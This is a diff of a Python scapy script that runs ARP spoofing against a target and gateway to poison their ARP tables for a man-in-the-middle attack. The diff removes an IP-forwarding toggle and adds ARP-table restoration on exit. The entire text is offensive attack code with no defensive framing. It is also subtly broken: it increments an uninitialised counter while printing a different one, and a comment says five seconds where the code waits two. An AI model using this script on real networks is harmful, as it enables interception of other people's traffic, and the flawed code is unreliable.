@@ -21,18 +21,23 @@ def spoof(target_ip, spoof_ip): # Build and send packet with obtained MAC and us
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
     scapy.send(packet, verbose = False) 
 
-def check_ipv4_forwarding(self, config='/proc/sys/net/ipv4/ip_forward'): # Enable IPv4 forwarding to not block the target while poisoning.
-    with open(config, mode='r+', encoding='utf_8') as config_file:
-        line = next(config_file)
-        config_file.seek(0)
-        config_file.write(line.replace('0', '1'))
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, verbose = False)
   
 try: # Launch ARP Spoofing until keyboard interrupt 
     packets_count = 0
-    self.check_ipv4_forwarding()
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2 # Sent packets counter 
-        print("\r[*] Packets Sent "+str(packets_count), end ="")
-        time.sleep(5) # Waits for five seconds before sending again
+        print("\r[*] Sent Packets: "+str(packets_count), end ="")
+        time.sleep(2) # Waits for five seconds before sending again
+
+except KeyboardInterrupt:
+    print("\nStopping script...")
+    restore(gateway_ip, target_ip)
+    restore(target_ip,gateway_ip)
+    print("ARP Poisoning Stopped")
